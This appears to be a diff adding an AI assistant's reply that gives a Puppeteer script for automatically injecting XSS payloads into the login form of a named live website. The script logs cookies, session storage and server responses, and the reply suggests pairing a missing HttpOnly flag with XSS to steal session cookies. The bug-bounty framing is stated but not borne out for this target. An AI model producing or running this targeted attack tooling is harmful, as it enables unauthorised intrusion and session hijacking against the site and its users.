@@ -1,0 +1,173 @@
+To expand your script to monitor browser session cookies and session storage key changes, you need to utilize Puppeteer’s native storage inspection wrappers.
+By taking a snapshot of cookies and tokens before the submission and comparing them to a snapshot taken after the submission, you can catch critical security flaws like:
+
+* Session Fixation: Checking if session IDs fail to rotate properly when a user interacts with account authentication states.
+* Token Leakage: Verifying if sensitive tracking variables (like pawaPassEnv structures or internal analytics hashes) are written or exposed dynamically to global client storage layers.
+
+------------------------------
+## Upgraded Code: full_audit_detector.js
+Create a new file named full_audit_detector.js and paste this comprehensive auditing layer:
+
+const puppeteer = require('puppeteer');const fs = require('fs');
+const payloads = [
+    '"><script>alert(1)</script>',
+    '" onerror="alert(1)',
+    '</script><script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>'
+];
+const targetUrl = 'https://1w.cash'; 
+const FORM_FIELDS = [
+    { name: 'Username Field', selector: 'input[name="username"]', safeValue: 'valid_test_user' },
+    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
+];
+const SUBMIT_SELECTOR = 'button[type="submit"]';
+async function scanWithFullAudit() {
+    console.log(`[+] Initializing Chromium Browser with Storage and Response Monitors...`);
+    const browser = await puppeteer.launch({ headless: true });
+
+    for (let targetField of FORM_FIELDS) {
+        console.log(`\n==================================================`);
+        console.log(`[🚀 FULL AUDIT]: ${targetField.name}`);
+        console.log(`==================================================`);
+
+        for (let payload of payloads) {
+            const page = await browser.newPage();
+            let lastServerResponseText = "";
+
+            // Intercepting backend server raw responses
+            page.on('response', async (response) => {
+                const url = response.url();
+                if (url.includes('api') || url === targetUrl || response.status() >= 400) {
+                    try {
+                        const contentType = response.headers()['content-type'] || '';
+                        if (contentType.includes('json') || contentType.includes('text/html')) {
+                            lastServerResponseText = await response.text();
+                        }
+                    } catch (err) {}
+                }
+            });
+
+            // Listen for structural client-side XSS dialog boxes
+            page.on('dialog', async dialog => {
+                if (dialog.type() === 'alert') {
+                    console.log(`\n[🚨 XSS EXECUTED!] Field: ${targetField.name} | Payload: ${payload}`);
+                    await dialog.dismiss();
+                }
+            });
+
+            try {
+                await page.goto(targetUrl, { waitUntil: 'networkidle2' });
+
+                // --- SNAPSHOT 1: CAPTURING INITIAL STORAGE STATE ---
+                const initialCookies = await page.cookies();
+                const initialSessionStorage = await page.evaluate(() => JSON.stringify(sessionStorage));
+
+                // Fill form fields sequentially
+                for (let currentField of FORM_FIELDS) {
+                    await page.waitForSelector(currentField.selector, { timeout: 4000 });
+                    await page.click(currentField.selector);
+                    
+                    await page.keyboard.down('Control');
+                    await page.keyboard.press('A');
+                    await page.keyboard.up('Control');
+                    await page.keyboard.press('Backspace');
+
+                    if (currentField.name === targetField.name) {
+                        console.log(`[*] Injecting payload into ${currentField.name}: ${payload}`);
+                        await page.type(currentField.selector, payload);
+                    } else {
+                        await page.type(currentField.selector, currentField.safeValue);
+                    }
+                }
+
+                // Submit the interactive form elements
+                await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
+                console.log(`[*] Submitting and monitoring redirection state...`);
+                
+                await Promise.all([
+                    page.click(SUBMIT_SELECTOR),
+                    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
+                ]);
+
+                // --- SNAPSHOT 2: CAPTURING POST-SUBMISSION STORAGE STATE ---
+                const finalCookies = await page.cookies();
+                const finalSessionStorage = await page.evaluate(() => JSON.stringify(sessionStorage));
+                const visibleHtmlTree = await page.evaluate(() => document.body.innerHTML);
+
+                // Analyze cookie flag security controls (Strictly related to program compliance checklists)
+                let insecureCookieWarnings = "";
+                finalCookies.forEach(cookie => {
+                    if (!cookie.httpOnly) {
+                        insecureCookieWarnings += `[⚠️ COOKIE RISK] Cookie '${cookie.name}' is missing HttpOnly flag. Frontend scripts can read it.\n`;
+                    }
+                    if (!cookie.secure) {
+                        insecureCookieWarnings += `[⚠️ COOKIE RISK] Cookie '${cookie.name}' is missing Secure flag. Transmitted via plaintext HTTP paths.\n`;
+                    }
+                });
+
+                // Generate and save detailed audit logging outputs
+                const logFileName = `audit_${targetField.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
+                const auditContent = `=========================================
+TRANSACTION SCOPE & INPUT DATA
+=========================================
+Target Field: ${targetField.name}
+Payload String: ${payload}
+Final Redirected URL: ${page.url()}
+
+=========================================
+[STORAGE LAYER AUDIT] COOKIES & KEYS
+=========================================
+${insecureCookieWarnings || "[+] All active session cookies have security flags intact.\n"}
+INITIAL COOKIES:
+${JSON.stringify(initialCookies, null, 2)}
+
+POST-SUBMISSION COOKIES:
+${JSON.stringify(finalCookies, null, 2)}
+
+INITIAL SESSION STORAGE:
+${initialSessionStorage}
+
+POST-SUBMISSION SESSION STORAGE:
+${finalSessionStorage}
+
+=========================================
+[NETWORK LAYER AUDIT] LAST RESPONSES
+=========================================
+${lastServerResponseText || "[-] No dynamic response data captured from active execution frames."}
+
+=========================================
+[DOM LAYER REFLECTION AUDIT] (TRUNCATED)
+=========================================
+${visibleHtmlTree.substring(0, 500)}...
+\n`;
+
+                fs.writeFileSync(logFileName, auditContent);
+                console.log(`[+] Full execution audit traces written out to: ${logFileName}`);
+
+            } catch (error) {
+                console.log(`[-] Process timed out or altered during request cycle.`);
+            } finally {
+                await page.close();
+            }
+        }
+    }
+
+    console.log(`\n[+] Full System Audit Completed.`);
+    await browser.close();
+}
+
+scanWithFullAudit();
+
+------------------------------
+## Step 2: Run and Read Your Logs
+Execute the complete scanning tool suite via your terminal environment node runtime:
+
+node full_audit_detector.js
+
+When reviewing the audit_*.txt files locally, look for the following changes:
+
+   1. Session Storage Fluctuations: If the payload execution somehow broke application flows, check if new unexpected internal strings or objects are added or altered under POST-SUBMISSION SESSION STORAGE.
+   2. Missing HttpOnly Flags: The script explicitly flags this under [STORAGE LAYER AUDIT]. If a cookie lacks HttpOnly, it is an administrative policy gap. While usually a low-level issue on its own, if you find a DOM XSS on the page simultaneously, you can steal that session cookie, elevating the report to a high-severity bounty payout.
+
+Would you like to examine how to parse these output logs automatically to highlight changes in session IDs, or would you like to see how to structure this final audit data into a formal HackerOne vulnerability report template for your program submissions? Let me know.
+
